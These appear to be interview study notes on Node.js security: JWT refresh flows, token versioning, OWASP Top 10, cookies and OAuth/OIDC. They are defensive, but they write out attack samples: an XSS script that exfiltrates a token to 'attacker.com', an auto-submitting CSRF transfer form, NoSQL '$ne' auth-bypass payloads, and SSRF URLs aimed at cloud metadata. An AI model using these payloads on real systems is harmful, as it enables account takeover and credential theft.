# ⚫ 07 — Security & Authentication

---

📍 **Progress Marker**
- Last Revised: ___________
- Revision Count: 0
- Difficulty Level: ⚫ Hard

---

## Q1 — How does JWT work? Explain the full flow with refresh token.

---

- Stateless authentication mechanism
    
- Used to securely transfer data between client & server
    
- Eliminates need for server-side session storage
    

---

## 🧩 Structure of JWT

A JWT consists of **3 parts**:

```
HEADER.PAYLOAD.SIGNATURE
```

---

### 1. Header

Contains metadata about the token

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

---

### 2. Payload

Contains claims (data)

```json
{
  "userId": "123",
  "email": "user@test.com",
  "exp": 1712345678
}
```

#### Types of claims:

- **Registered** → `exp`, `iat`, `iss`
    
- **Public** → shared standard fields
    
- **Private** → custom (e.g. userId)
    

---

### 3. Signature

Ensures token integrity (cannot be tampered)

```
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret
)
```

👉 If payload changes → signature becomes invalid

---

## 🔁 How JWT Authentication Works (Memory + Cookie Strategy)

### 🟢 Login Flow

1. Client → `/login`
    
2. Server:
    
    - validates credentials
        
    - generates:
        
        - accessToken (short-lived)
            
        - refreshToken (long-lived)
            
3. Server:
    
    - returns accessToken (response)
        
    - sets refreshToken (HTTP-only cookie)
        
    - stores refreshToken in DB
        

---

### 🟢 Client Storage

- Access Token → **in memory (React state / store)**
    
- Refresh Token → **HTTP-only cookie**
    

---

### 🟢 API Requests

Client sends:

```
Authorization: Bearer <accessToken>
```

Server:

- verifies signature
    
- checks expiry
    

---

### 🟡 Token Expiry Handling

1. Server returns `401 Unauthorized`
    
2. Client interceptor calls `/refresh`
    

---

### 🟡 Refresh Flow

1. Browser sends refreshToken automatically (cookie)
    
2. Server:
    
    - validates refresh token
        
    - rotates refresh token (new one issued)
        
    - returns new accessToken
    - sets refreshToken (HTTP-only cookie)
        
    - stores refreshToken in DB
        

---

### 🟢 Retry

- Client updates token in memory
    
- Retries original request
    

---

### 🔴 Failure Case

- If refresh fails (`403 Forbidden`)
    
    - logout user
        
    - clear state
        

---

## 🔐 Security Model

### Access Token

- Short-lived (10–15 min)
    
- Stored in memory
    
- Sent in Authorization header
    

---

### Refresh Token

- Long-lived
    
- Stored in HTTP-only cookie
    
- Rotated on every refresh
    
- Stored in DB
    

---

## ⚖️ Why This Approach?

### ✅ Advantages

- Stateless backend (no session store needed)
    
- Scales easily
    
- Secure against XSS (no localStorage)
    
- Automatic session continuation via refresh
    

---

### ❌ Trade-offs

- Requires interceptor logic
    
- Slight complexity in refresh handling
    
- Needs careful concurrency control
    

---

## 🧠 Key Concepts

### Stateless Authentication

- Server does not store session
    
- JWT itself carries identity
    

---

### Token Rotation

- Every refresh → new refresh token
    
- Old token invalidated
    

---

### Reuse Detection

- If old refresh token reused → possible attack
    
- Force logout everywhere
    

---

## ⚡ Mental Model

```
Access Token  → Short-lived, used frequently
Refresh Token → Long-lived, used rarely, highly secure
```

---

## ✅ Final Takeaway

JWT enables:

- **Secure**
    
- **Stateless**
    
- **Scalable authentication**
    

👉 Best practice:

- Access token → memory
    
- Refresh token → HTTP-only cookie
    
- Use interceptors + rotation
    

---
## Q2 —  How to Reduce the Impact of Stolen JWT (Access Token) or Refresh Token?

---

## 🎯 Goal

Even if an access token is stolen:

- ⏱️ Limit **time of misuse**
    
- 🔒 Limit **what attacker can do**
    
- 🚫 Enable **instant revocation**
    

---

## ⚠️ Reality

> A stolen access token **cannot be fully blocked immediately**  
> 👉 Strategy = **Limit + Contain + Revoke Fast**

---

## ✅ Must-Use Security Measures

---

### 1. ⏱️ Short-Lived Access Token (MOST IMPORTANT)

- Expiry: **10–15 minutes max**
    
- High-security apps: **5 minutes**
    

👉 Reduces attacker window drastically

---

### 2. 🌐 Enforce HTTPS Everywhere

- All APIs + frontend must use HTTPS
    

👉 Prevents token interception (MITM attacks)

---

### 3. 🧠 Store Access Token in Memory Only

- React state / Redux / in-memory variable
    
- ❌ Avoid `localStorage` / `sessionStorage`
    

👉 Prevents easy theft via XSS

---

### 4. 🍪 Use HTTP-only Secure Cookie for Refresh Token

```js
{
  httpOnly: true,
  secure: true,
  sameSite: "Strict" // or "Lax"
}
```

👉 Ensures attacker **cannot extend session**

---

### 5. 🔁 Refresh Token Rotation

- Every `/refresh`:
    
    - Issue new refresh token
        
    - Invalidate old one
        

👉 Prevents long-term session hijacking

---

### 6. 🔄 Proper 401 → Refresh Flow

- On `401 Unauthorized`:
    
    - Call `/refresh`
        
    - Retry original request **once only**
        

👉 Maintains UX + prevents infinite loops

---

### 7. 🚪 Logout on Refresh Failure

- If `/refresh` returns `403`:
    
    - Clear tokens
        
    - Redirect to login
        

👉 Stops unauthorized session continuation

---

# 🔥 8. 🧾 Token Versioning (DETAILED)

---

## 🧠 What is Token Versioning?

A **server-controlled version number** stored in DB that is:

- Embedded in JWT at issue time
    
- Verified on every request
    

👉 Acts as a **global kill switch for all tokens**

---

## 🟢 How It Works (Flow)

### Step 1 — Store in DB on create user

```js
user = {
  _id: "123",
  tokenVersion: 1
}
```

---

### Step 2 — Embed in JWT

```js
jwt.sign({
  userId: user._id,
  tokenVersion: user.tokenVersion
})
```

---

### Step 3 — Validate on Every Request

```js
if (decoded.tokenVersion !== user.tokenVersion) {
  throw "Token revoked";
}
```

---

## 🔥 Why This Is Powerful

- JWT is stateless ❌
    
- Token versioning makes it **revocable** ✅
    
- One DB update → **invalidate all sessions instantly**
    

---

## 🔴 When to INCREMENT tokenVersion (VERY IMPORTANT)

👉 This is where most developers fail

---

### ✅ 1. Logout from All Devices

```js
user.tokenVersion += 1;
```

👉 Invalidates all active access tokens

---

### ✅ 2. Password Change (MANDATORY)

```js
user.password = newPassword;
user.tokenVersion += 1;
```

👉 Prevents attacker continuing after password reset

---

### ✅ 3. Refresh Token Reuse Detected (SECURITY BREACH)

Scenario:

- Old refresh token reused after rotation
    

👉 Action:

```js
user.tokenVersion += 1;
```

👉 Immediately kill all sessions

---

### ✅ 4. Suspicious Activity Detected

Examples:

- Sudden IP change (India → Europe)
    
- Unusual request spikes
    
- Accessing sensitive endpoints abnormally
    

👉 Action:

```js
user.tokenVersion += 1;
```

---

### ✅ 5. Admin Force Logout

```js
await User.updateOne(
  { _id: userId },
  { $inc: { tokenVersion: 1 } }
);
```

👉 Useful for:

- Compromised accounts
    
- Policy enforcement
    

---

### ✅ 6. Account Recovery / Email Change

👉 If identity changes → invalidate sessions

---

## ⚠️ When NOT to Increment

🚫 On every refresh  
🚫 On every login  
🚫 On normal API usage

👉 Otherwise:

- Users get logged out constantly ❌
    
- System becomes unusable ❌
    

---

## 🔄 Full Lifecycle Example

```text
1. User logs in → tokenVersion = 1

2. Token issued (version=1)

3. Attacker steals token 😬

4. User changes password
   → tokenVersion = 2

5. Attacker uses old token (version=1)
   → ❌ Rejected instantly

6. User logs in again
   → gets token(version=2)
```

---

## ⚠️ Critical Requirement

> Token versioning ONLY works if validated on EVERY request

```js
if (decoded.tokenVersion !== user.tokenVersion) reject();
```

👉 Skipping this = zero security

we can use caching for this to store token version for user

---

## 🧠 Mental Model

> tokenVersion = **server-side session authority over stateless JWT**

---

## 🧩 Combined with Other Layers

|Layer|Purpose|
|---|---|
|Short expiry|Limits time|
|Refresh rotation|Prevents persistence|
|Token versioning|Instant kill switch|
|Step-up auth|Protects sensitive actions|

---

## 🔐 9. Step-Up Authentication (Critical Actions)

- Require password / OTP for:
    
    - Payments
        
    - Password change
        
    - Email update
        

---

## 🚦 10. Rate Limiting

- Limit API requests per token/IP
    

👉 Prevents abuse if compromised

---

## ⚡ Production Checklist

-  Access token expiry ≤ 15 min
    
-  HTTPS enabled everywhere
    
-  Access token stored in memory
    
-  Refresh token in httpOnly cookie
    
-  Refresh token rotation implemented
    
-  401 → refresh → retry flow
    
-  Logout on refresh failure
    
-  Token versioning implemented
    
-  tokenVersion increment on critical events
    
-  Middleware validation for version
    
-  Rate limiting applied
    
-  Step-up auth for sensitive APIs
    

---

## 🧠 Final Takeaway

> You cannot stop a stolen JWT from being used  
> 👉 You **limit its lifetime, restrict power, and revoke instantly using tokenVersion**

---

## Q3 — What are the OWASP Top 10 vulnerabilities relevant to Node.js?

---

## 🎯 Core Idea

The OWASP Top 10 is language-agnostic, but Node.js apps are especially vulnerable due to:

- Heavy use of npm packages
    
- JSON-based APIs
    
- Async flows (harder to track security gaps)
    

---

# 🚨 1. Broken Access Control

### ❓ Problem

Users access data/resources without proper authorization.

### 💥 Node.js Example

```js
app.get('/admin', (req, res) => {
  res.send("Admin data"); // ❌ no role check
});
```

### ✅ Fix (RBAC Middleware)

```js
const authorize = (roles = []) => {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ message: "Forbidden" });
    }
    next();
  };
};

app.get('/admin', authenticate, authorize(['admin']), handler);
```

---

# 🔑 2. Cryptographic Failures

### ❓ Problem

Weak encryption / plain-text sensitive data.

### 💥 Mistakes

- Storing passwords directly
    
- Using MD5/SHA1
    

### ✅ Fix

```js
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 10);
```

✔ Always:

- Use bcrypt/argon2
    
- Use HTTPS
    
- Store secrets in `.env`
    

---

# 💉 3. Injection (NoSQL / Command)

### ❓ Problem

User input alters queries/commands.

### 💥 NoSQL Injection

```js
User.find({ username: req.body.username }); // ❌ unsafe
```

Attack:

```json
{ "username": { "$ne": null } }
```

### ✅ Fix

```js
const Joi = require('joi');

const schema = Joi.object({
  username: Joi.string().required()
});

await schema.validateAsync(req.body);

User.find({ username: req.body.username });
```

---

# 🧠 4. Insecure Design

### ❓ Problem

Security not considered in architecture.

### 💥 Examples

- No rate limiting
    
- Infinite login attempts
    
- No token expiry
    

### ✅ Fix

```js
const rateLimit = require('express-rate-limit');

app.use('/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5
}));
```

---

# ⚙️ 5. Security Misconfiguration

### ❓ Problem

Unsafe defaults / misconfigured server

### 💥 Examples

```js
app.use(cors()); // ❌ allows all origins
```

### ✅ Fix

```js
const helmet = require('helmet');
app.use(helmet());

app.use(cors({
  origin: ['https://yourdomain.com']
}));
```

---

# 📦 6. Vulnerable & Outdated Components

### ❓ Problem

Using insecure npm packages

### 💥 Risk

- Supply chain attacks
    
- Deep dependency issues
    

### ✅ Fix

```bash
npm audit
npm audit fix
```

✔ Use:

- Snyk
    
- Dependabot
    
- Lock files
    

---

# 🔐 7. Authentication Failures (JWT Focus)

### ❓ Problem

Broken login/session handling

### 💥 Common JWT Issues

- Long-lived tokens
    
- No logout
    
- No rotation
    

---

## ✅ Best Practice JWT Flow

### Access Token

- Short-lived (15 min)
    

### Refresh Token

- Stored in DB / Redis
    
- Rotated on every use
    

---

## 🔁 Refresh Token Rotation (Important)

```js
if (storedToken !== incomingToken) {
  // reuse detected
  revokeAllSessions(userId);
}
```

---

## 🧠 Optimization (IMPORTANT for you)

Instead of DB hit every request:

### Option 1: Redis

```js
redis.get(userId); // tokenVersion
```

### Option 2: Token Version in JWT

```js
if (decoded.tokenVersion !== user.tokenVersion) reject();
```

✔ Best combo:

- Access token → stateless
    
- Refresh token → DB/Redis tracked
    

---

# 🧾 8. Data Integrity Failures

### ❓ Problem

Trusting unverified packages/data

### 💥 Example

- Malicious npm package
    

### ✅ Fix

- Use `package-lock.json`
    
- Avoid random packages
    
- Verify sources
    

---

# 📊 9. Logging & Monitoring Failures

### ❓ Problem

No visibility into attacks

### 💥 Missing Logs

- Failed logins
    
- Token misuse
    

### ✅ Fix

```js
logger.warn("Failed login attempt", { user });
```

✔ Use:

- Winston / Pino
    
- Central logging (ELK)
    

---

# 🌐 10. SSRF (Server-Side Request Forgery)

### ❓ Problem

Server makes malicious requests

### 💥 Example

```js
axios.get(req.body.url); // ❌ dangerous
```

### ✅ Fix

```js
const allowedDomains = ['api.trusted.com'];

if (!allowedDomains.includes(new URL(url).hostname)) {
  throw new Error("Blocked");
}
```

---

# 🔥 Node.js-Specific Extra Risks

## 1. Prototype Pollution

```js
lodash.merge({}, userInput); // ❌ risky
```

## 2. Event Loop Blocking (DoS)

```js
while(true) {} // ❌ blocks server
```

## 3. Unsafe JWT Storage

- ❌ localStorage
    
- ✅ HTTP-only cookies
    

---

# ⚡ Final Interview Summary (Say This)

👉 "In Node.js, the most critical OWASP risks are broken access control, injection (especially NoSQL), insecure JWT handling, and vulnerable npm dependencies. I mitigate them using strict input validation (Joi/Zod), RBAC middleware, secure JWT rotation with Redis, rate limiting, and dependency auditing."

---

# 🧠 Your Priority Checklist (Real-World)

✔ Input validation everywhere  
✔ RBAC middleware  
✔ JWT rotation + reuse detection  
✔ Rate limiting on auth APIs  
✔ npm audit + dependency hygiene  
✔ Secure headers (helmet)  
✔ Logging + monitoring

---

# 🚀 Pro Tip (Senior-Level Insight)

👉 "Security is not a feature — it's a system design concern."

Always think:

- What if token is stolen?
    
- What if user manipulates request?
    
- What if dependency is compromised?
    
---

## Q3 — What are different types of attacks and how do you protect against common Node.js attacks?

---

## 🔴 1. Injection (SQL / NoSQL / Command)

**What:** Untrusted input executed as code

**💣 Attack Flow:**

1. Find input (login/search)
    
2. Send crafted payload (`$ne`, `$gt`)
    
3. DB treats it as query logic
    
4. Auth bypass / data leak
    

**Example:**

```json
{ "email": { "$ne": null }, "password": { "$ne": null } }
```

**Fix:** Validate + sanitize + parameterized queries

---

## 🔴 2. Authentication & JWT Attacks

**What:** Token misuse

**💣 Attack Flow:**

1. Steal token (via XSS / logs)
    
2. OR crack weak secret
    
3. Reuse/forge token
    
4. Access protected APIs
    

**Fix:** HTTP-only cookies, short expiry, rotation

---

## 🔴 3. XSS (Cross-Site Scripting)

**What:** Inject JS into UI

**💣 Attack Flow (Stored XSS):**

1. Attacker submits input:
    

```html
<script>
fetch("https://attacker.com?token=" + localStorage.getItem("token"))
</script>
```

2. Server stores it in DB
    
3. Another user opens page, lets say user listing
    
4. Backend returns stored content
    
5. Frontend renders without escaping
    
6. Script executes in browser
    
7. Token/session stolen
    

**Impact:** Account takeover

**Fix:**

- Escape output (EJS, etc.)
    
- Avoid `innerHTML`
    
- Sanitize (DOMPurify)
    
- Use **helmet** → enables CSP
    

**CSP Example:**

```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  }
}));
```

➡️ Blocks inline/malicious scripts

---

## 🔴 4. CSRF (Cross-Site Request Forgery)

**What:** Trick browser to send request

**💣 Real Flow (Bank Example):**

1. User logs into `bank.com` → cookie stored
    
2. User visits phishing site
    
3. Attacker page:
    

```html
<body onload="document.forms[0].submit()">
<form action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker" />
</form>
</body>
```

4. Browser auto-submits
    
5. Cookies auto-attached
    
6. Server trusts request
    
7. Money transferred
    

**Fix:** SameSite cookies, CSRF token, origin check

---

## 🔴 5. SSRF (Server-Side Request Forgery)

**What:** Server makes attacker-controlled request

**💣 Attack Flow:**

1. Vulnerable API:
    

```js
app.get("/fetch", async (req, res) => {
  const response = await fetch(req.query.url);
  res.send(await response.text());
});
```

2. Attacker sends:
    

```
/fetch?url=http://localhost:3000/admin
```

3. Server calls internal service
    
4. Returns sensitive data
    

**💣 Cloud Attack:**

```
/fetch?url=http://169.254.169.254/latest/meta-data/
```

➡️ Leak credentials

**Fix:** Allowlist, block private IPs, validate DNS

---

## 🔴 6. Brute Force / Credential Stuffing / DoS

**💣 Attack Flow:**

1. Use leaked creds
    
2. Automate login attempts
    
3. Gain access / overload server
    

**Fix:** Rate limit, CAPTCHA, lock, bcrypt

---

## 🔴 7. File Upload Vulnerabilities

**💣 Attack Flow:**

1. Upload malicious file
    
2. Stored insecurely
    
3. Access via URL
    
4. Execute
    

**Fix:** Validate type/content, rename, limit size

---

## 🔴 8. Path Traversal

**💣 Attack Flow:**

1. Inject `../../`
    
2. Server resolves path
    
3. Sensitive file returned
    

**Fix:** `path.resolve`, allowlist, block traversal

---

# ⚡ Golden Rule

> Never trust user input  
> Validate → Sanitize → Restrict → Monitor

---

# Q4 — What is Cookie and How to do Secure Cookie Setup in Node.js?

---

## 🧠 What is a Cookie?

> Small data stored by browser for a domain  
> Automatically sent with every request to that domain

```text
token = abc123
```

---

## 🔁 How it Works

### 1. Server sets cookie

```http
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
```

---

### 2. Browser stores it

- Saved for `yourapp.com`
    

---

### 3. Browser auto-sends

```http
Cookie: token=abc123
```

👉 No manual work—browser handles it

---

## 🛠️ How to Use in Node.js

### ✅ Set Secure Cookie

```js
res.cookie("token", token, {
  httpOnly: true,              // no JS access (XSS safe)
  secure: true,                // HTTPS only
  sameSite: "Strict",          // CSRF protection
  maxAge: 15 * 60 * 1000       // expiry (15 min)
});
```

---

### ✅ Read Cookie

```js
req.cookies.token   // using cookie-parser
```

---

### ✅ Clear Cookie

```js
res.clearCookie("token");
```

---

## 🔐 Important Flags (Must Know)

- `httpOnly` → prevents JS access → 🛡️ XSS
    
- `secure` → HTTPS only → 🛡️ MITM
    
- `sameSite` → blocks cross-site → 🛡️ CSRF
    
- `maxAge` → limits lifetime
    

---

## ⚠️ Best Practices

- Use short-lived tokens (≈15 min)
    
- Store only token/session ID (no sensitive data)
    
- Use `SameSite=Lax` if Strict breaks flows
    
- Always use HTTPS in production
    
- Clear cookie on logout
    

---

## 🧠 Mental Model

> Cookie = browser-stored ID card  
> Server gives it → browser keeps it → browser shows it automatically

---

## ⚡ Summary

> Cookies enable authentication by maintaining state  
> Secure setup = httpOnly + secure + sameSite + expiry

---
## Q5 — OAuth 2.0 + OpenID Connect + Roles (Complete Auth Guide)

---

## 🧠 Big Picture

> **OAuth 2.0 = Authorization (access)**  
> **OIDC = Authentication (identity)**  
> **Your Backend = Roles & Permissions (authorization logic)**

---

## 🔐 What is OAuth 2.0?

**OAuth 2.0 allows your application (a third-party) to access a user’s data from another service (like Google), with the user’s permission, without requiring the user to share their password.**

- It works by using **tokens (issued by the provider like Google)** to securely access APIs.

👉 Example: _Login with Google_

---

## 🎯 Purpose of OAuth 2.0

- Grant limited access to APIs
    
- Delegate permissions securely
    

---

## 🔑 Access Token

- Used to call APIs:
    

```http
Authorization: Bearer <access_token>
```

- Represents:
    
    - “User allowed this app to access data”
        

---

## ⚠️ Problem with OAuth 2.0 Alone

- ❌ No standard way to identify user
    
- ❌ Access token format varies (opaque/JWT)
    
- ❌ No guaranteed user info
    

👉 So you **cannot reliably authenticate user**

---

## 🆔 Why OpenID Connect (OIDC) is Required

- OIDC = **Authentication layer on top of OAuth 2.0**
    
- Adds **ID Token (JWT)**
    

---

## 🔑 ID Token (Most Important)

Contains identity:

```json
{
  "sub": "123",
  "email": "user@gmail.com",
  "name": "Sandesh"
}
```

✔️ Standardized  
✔️ Signed (can verify)  
✔️ Reliable identity

---

## 🧩 OAuth vs OIDC

|Feature|OAuth 2.0|OIDC|
|---|---|---|
|Purpose|Authorization|Authentication|
|Token|Access Token|ID Token|
|Identity|❌|✅|
|Standard User Info|❌|✅|

---

## 🔁 Complete Flow (Best Practice)

1. User clicks login (Google)
    
2. Redirect to provider
    
3. User logs in + consents
    
4. Backend receives **code**
    
5. Exchange code → get:
    
    - Access Token
        
    - **ID Token**
        
6. Verify ID Token
    
7. Extract user identity
    
8. Check/Create user in DB
    
9. Assign role
    
10. Issue your own JWT
    

---

## 🏗️ Role Management (Critical Concept)

### ❗ Truth

> Google does NOT know your roles

---

## 🗄️ Roles Stored in Your DB

```json
{
  "email": "user@gmail.com",
  "role": "admin"
}
```

---

## 🔁 Role Assignment Flow

### Existing User

```js
const user = await User.findOne({ email });
// role already exists
```

---

### New User

```js
const user = await User.create({
  email,
  role: "user" // default role
});
```

---

## 🔐 Your JWT (Final Step)

```json
{
  "userId": "123",
  "role": "admin"
}
```

✔️ This is what your backend trusts

---

## 🔒 Authorization in Your App

### Middleware Example

```js
function authorize(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).send("Forbidden");
    }
    next();
  };
}
```

---

## 🧠 Responsibility Split

|System|Responsibility|
|---|---|
|Google (OAuth/OIDC)|Identity (who user is)|
|Your Backend|Roles & Permissions|
|Your JWT|Session + Authorization|

---

## ⚠️ Common Misconceptions

- ❌ Access token contains roles
    
- ❌ OAuth = Authentication
    
- ❌ Google manages your permissions
    

---

## 🧩 Advanced Concepts (Interview Level)

### 🟢 RBAC (Role-Based Access Control)

- Roles: admin, user
    
- Simple and common
    

---

### 🔵 ABAC (Attribute-Based Access Control)

- Based on:
    
    - user attributes
        
    - resource
        
    - conditions
        
- Example:
    

```js
if (user.department === "HR") allow();
```

---

### 🟡 Token Strategy

- Access Token → short-lived
    
- Refresh Token → long-lived
    
- Your JWT → session management
    

---

## 🚀 Real-World Architecture (Your Setup)

```text
Google (OIDC)
      ↓
ID Token (identity)
      ↓
Your Backend
      ↓
DB (user + role)
      ↓
Your JWT (role inside)
      ↓
Protected APIs
```

---

## 🧠 Final Mental Model

> OAuth → “What can I access?”  
> OIDC → “Who am I?”  
> Your Backend → “What am I allowed to do?”

---

## 📌 When to Use What

- OAuth 2.0 → API access
    
- OIDC → Login / identity
    
- JWT (your own) → App sessions
    
- DB → Roles & permissions
    

---

## 🔥 One-Line Summary

> **Google authenticates the user, your system authorizes the user**

---

## 🏆 Top 5 Must Revise Before Interview

1. **JWT structure + access/refresh pattern** — draw the flow
2. **bcrypt vs JWT** — different purposes: password storage vs auth tokens
3. **NoSQL injection** — how it works, how mongo-sanitize fixes it
4. **helmet** — what headers it sets and why
5. **OAuth 2.0 flow** — step-by-step Authorization Code flow

---

## 🎤 Real Interview Questions

- *"Why can't you invalidate a JWT without a blacklist?"*
- *"What is the difference between authentication and authorization?"*
- *"How would you protect a login endpoint from brute force?"*
- *"Where should you store JWTs — localStorage or cookies? Why?"*
- *"What is PKCE and why is it needed for SPAs?"*
